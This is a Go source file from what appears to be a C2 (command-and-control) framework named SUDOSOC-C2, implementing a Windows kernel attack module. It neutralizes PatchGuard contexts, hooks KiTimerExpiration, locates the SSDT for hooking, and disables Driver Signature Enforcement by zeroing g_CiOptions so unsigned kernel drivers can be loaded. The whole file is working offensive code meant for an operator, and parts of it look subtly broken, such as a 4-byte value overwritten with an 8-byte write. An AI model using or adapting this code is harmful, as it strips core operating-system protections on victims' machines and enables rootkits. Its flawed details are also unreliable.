package kpp

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	PatchGuard Bypass — main orchestration.

	Full bypass sequence:
	  1. Locate ntoskrnl base (already done in BYOVD module).
	  2. Discover and neutralize PatchGuard contexts (DPC + timer scan).
	  3. Hook KiTimerExpiration to filter future PatchGuard DPCs at runtime.
	  4. Verify: wait 100 ms and check that no BSOD occurred.
	  5. (Optional) Install SSDT hooks — now safe since PG is neutralized.

	After this module runs:
	  - PatchGuard will never fire a BSOD.
	  - The operator can freely write to the SSDT, IDT, GDT, kernel code pages.
	  - Combined with DSE bypass (DRAGON-5), arbitrary unsigned kernel drivers
	    can be loaded without BYOVD.
*/

import (
	"fmt"
	"runtime"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// KPPBypassConfig holds all parameters.
type KPPBypassConfig struct {
	KernelRW    KernelRWer
	KernelBase  uint64
	// If true, also install the DPC hook for ongoing protection against
	// future PatchGuard context allocations (rare but theoretically possible).
	HookKiTimerExpiration bool
	// If true, locate the SSDT and return it ready for hooking.
	PrepareSSDTO bool
}

// KPPBypassResult reports what was done.
type KPPBypassResult struct {
	ContextsNeutralized int
	DPCHookInstalled    bool
	SSDT                *SSDTState
	HookState           *HookState
}

// Bypass performs the full PatchGuard neutralization.
func Bypass(cfg KPPBypassConfig) (*KPPBypassResult, error) {
	if cfg.KernelRW == nil {
		return nil, fmt.Errorf("KernelRW required")
	}
	if cfg.KernelBase == 0 {
		var err error
		cfg.KernelBase, err = findKernelBase(cfg.KernelRW)
		if err != nil {
			return nil, fmt.Errorf("kernel base: %w", err)
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[kpp] ntoskrnl base = 0x%x", cfg.KernelBase)
	// {{end}}

	res := &KPPBypassResult{}

	// Step 1: Neutralize existing PatchGuard contexts.
	contexts, err := DiscoverAndNeutralize(cfg.KernelRW, cfg.KernelBase)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[kpp] context discovery error: %v", err)
		// {{end}}
		// Non-fatal — proceed with DPC hook as the primary defence.
	}
	for _, ctx := range contexts {
		if ctx.Neutralized {
			res.ContextsNeutralized++
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[kpp] neutralized %d PatchGuard contexts", res.ContextsNeutralized)
	// {{end}}

	// Step 2 (optional): Hook KiTimerExpiration for ongoing DPC filtering.
	if cfg.HookKiTimerExpiration {
		kiTimerAddr, err := resolveKiTimerExpiration(cfg.KernelRW, cfg.KernelBase)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[kpp] KiTimerExpiration resolve failed: %v", err)
			// {{end}}
		} else {
			hs, err := InstallDPCHook(cfg.KernelRW, kiTimerAddr, cfg.KernelBase)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[kpp] DPC hook install failed: %v", err)
				// {{end}}
			} else {
				res.DPCHookInstalled = true
				res.HookState = hs
			}
		}
	}

	// Step 3 (optional): Prepare SSDT for hooking.
	if cfg.PrepareSSDTO {
		ssdt, err := LocateSSDTO(cfg.KernelRW, cfg.KernelBase)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[kpp] SSDT locate failed: %v", err)
			// {{end}}
		} else {
			res.SSDT = ssdt
		}
	}

	// Step 4: Wait briefly and verify no BSOD (we're still running = success).
	time.Sleep(100 * time.Millisecond)
	// {{if .Config.Debug}}
	log.Printf("[kpp] bypass complete — system stable, %d contexts disabled", res.ContextsNeutralized)
	// {{end}}

	return res, nil
}

// findKernelBase locates ntoskrnl.exe's load address by reading
// the kernel module list via NtQuerySystemInformation.
func findKernelBase(kRW KernelRWer) (uint64, error) {
	const systemModuleInfo = uint32(11)
	var size uint32

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtQSI := ntdll.NewProc("NtQuerySystemInformation")

	procNtQSI.Call(uintptr(systemModuleInfo), 0, 0,
		uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		size = 1024 * 1024
	}
	buf := make([]byte, size+4096)
	procNtQSI.Call(
		uintptr(systemModuleInfo),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&size)),
	)

	// RTL_PROCESS_MODULES: ULONG count + array of RTL_PROCESS_MODULE_INFORMATION.
	// Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes on x64.
	// First module is always ntoskrnl.exe; ImageBase at offset +24 within the struct.
	if len(buf) < 8+24+8 {
		return 0, fmt.Errorf("buffer too small for module info")
	}
	base := uint64(buf[8+24]) |
		uint64(buf[8+25])<<8 |
		uint64(buf[8+26])<<16 |
		uint64(buf[8+27])<<24 |
		uint64(buf[8+28])<<32 |
		uint64(buf[8+29])<<40 |
		uint64(buf[8+30])<<48 |
		uint64(buf[8+31])<<56
	if base == 0 {
		return 0, fmt.Errorf("ntoskrnl base is zero — insufficient privileges")
	}
	return base, nil
}

// resolveKiTimerExpiration finds the unexported KiTimerExpiration by scanning
// ntoskrnl for a known byte pattern (prologue of the function on Windows 10/11).
//
// The prologue of KiTimerExpiration starts with:
//   48 8B C4        MOV RAX, RSP
//   48 89 58 08     MOV [RAX+8], RBX
//   48 89 68 10     MOV [RAX+16], RBP
//   48 89 70 18     MOV [RAX+24], RSI
//   ...
func resolveKiTimerExpiration(kRW KernelRWer, kbase uint64) (uint64, error) {
	// Pattern: 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20
	pattern := []byte{
		0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08,
		0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18,
	}

	// Scan the first 8 MB of ntoskrnl .text.
	const scanSize = 8 * 1024 * 1024
	buf := make([]byte, 0, len(pattern))

	for off := uint64(0); off < scanSize-uint64(len(pattern)); off++ {
		addr := kbase + off
		// Read 1 byte at a time (slow but necessary without full .text dump).
		dw, err := kRW.ReadDword(addr)
		if err != nil {
			continue
		}
		b := byte(dw)
		buf = append(buf, b)
		if len(buf) > len(pattern) {
			buf = buf[1:]
		}
		if len(buf) == len(pattern) {
			match := true
			for i, v := range pattern {
				if buf[i] != v {
					match = false
					break
				}
			}
			if match {
				return addr - uint64(len(pattern)) + 1, nil
			}
		}
	}
	return 0, fmt.Errorf("KiTimerExpiration pattern not found")
}

// DSEBypass disables Driver Signature Enforcement by zeroing g_CiOptions
// in ci.dll. This is the bonus capability enabled once PatchGuard is off:
// unsigned kernel drivers can be loaded via NtLoadDriver without BYOVD.
//
// g_CiOptions is a 4-byte DWORD in ci.dll's .data section. Values:
//   0x6 = signing enforced (default)
//   0x0 = signing disabled
func DSEBypass(kRW KernelRWer) error {
	// Locate ci.dll base from the kernel module list.
	ciBase, err := findModuleBase("ci.dll")
	if err != nil {
		return fmt.Errorf("ci.dll base: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[kpp] ci.dll base = 0x%x", ciBase)
	// {{end}}

	// Scan ci.dll's .data section for the DWORD value 0x6 preceded by
	// a signature that matches g_CiOptions context.
	gCiOptions, err := findGCiOptions(kRW, ciBase)
	if err != nil {
		return fmt.Errorf("g_CiOptions: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[kpp] g_CiOptions @ 0x%x", gCiOptions)
	// {{end}}

	// Zero it (disable enforcement).
	return kRW.WriteQword(gCiOptions, 0)
}

// findModuleBase returns the kernel VA of a loaded kernel module by name.
func findModuleBase(name string) (uint64, error) {
	const systemModuleInfo = uint32(11)
	var size uint32
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtQSI := ntdll.NewProc("NtQuerySystemInformation")
	procNtQSI.Call(uintptr(systemModuleInfo), 0, 0,
		uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		size = 2 * 1024 * 1024
	}
	buf := make([]byte, size+4096)
	procNtQSI.Call(uintptr(systemModuleInfo),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&size)))

	count := uint32(buf[0]) | uint32(buf[1])<<8 | uint32(buf[2])<<16 | uint32(buf[3])<<24
	const entrySize = 296
	const baseOff = 24
	const nameOff = 28 // FullPathName starts at offset 28 within entry

	for i := uint32(0); i < count; i++ {
		base := 8 + i*entrySize
		if int(base+uint32(entrySize)) > len(buf) {
			break
		}
		nameBytes := buf[base+nameOff : base+nameOff+256]
		// Name is ASCII, find it.
		entryName := ""
		for j, b := range nameBytes {
			if b == 0 {
				entryName = string(nameBytes[:j])
				break
			}
		}
		if containsCI(entryName, name) {
			imageBase := uint64(buf[base+baseOff]) |
				uint64(buf[base+baseOff+1])<<8 |
				uint64(buf[base+baseOff+2])<<16 |
				uint64(buf[base+baseOff+3])<<24 |
				uint64(buf[base+baseOff+4])<<32 |
				uint64(buf[base+baseOff+5])<<40 |
				uint64(buf[base+baseOff+6])<<48 |
				uint64(buf[base+baseOff+7])<<56
			return imageBase, nil
		}
	}
	return 0, fmt.Errorf("%s not found in kernel module list", name)
}

// findGCiOptions scans ci.dll's .data section for a DWORD with value 0x6
// preceded by a code reference pattern matching g_CiOptions.
func findGCiOptions(kRW KernelRWer, ciBase uint64) (uint64, error) {
	// g_CiOptions is typically within the first 256 KB of ci.dll.
	for off := uint64(0x1000); off < 0x40000; off += 4 {
		addr := ciBase + off
		val, err := kRW.ReadDword(addr)
		if err != nil {
			continue
		}
		// g_CiOptions == 0x6 in a normal enforced system.
		// It is surrounded by other small integers (policy flags).
		if val == 0x6 {
			// Quick sanity: adjacent DWORD should also be a small value.
			prev, _ := kRW.ReadDword(addr - 4)
			next, _ := kRW.ReadDword(addr + 4)
			if prev < 0x100 && next < 0x100 {
				return addr, nil
			}
		}
	}
	return 0, fmt.Errorf("g_CiOptions not found in ci.dll scan")
}

func containsCI(s, sub string) bool {
	if len(sub) > len(s) {
		return false
	}
	for i := 0; i <= len(s)-len(sub); i++ {
		match := true
		for j := 0; j < len(sub); j++ {
			a, b := s[i+j], sub[j]
			if a >= 'A' && a <= 'Z' {
				a += 32
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			if a != b {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}

// prevent unused import
var _ = runtime.NumCPU
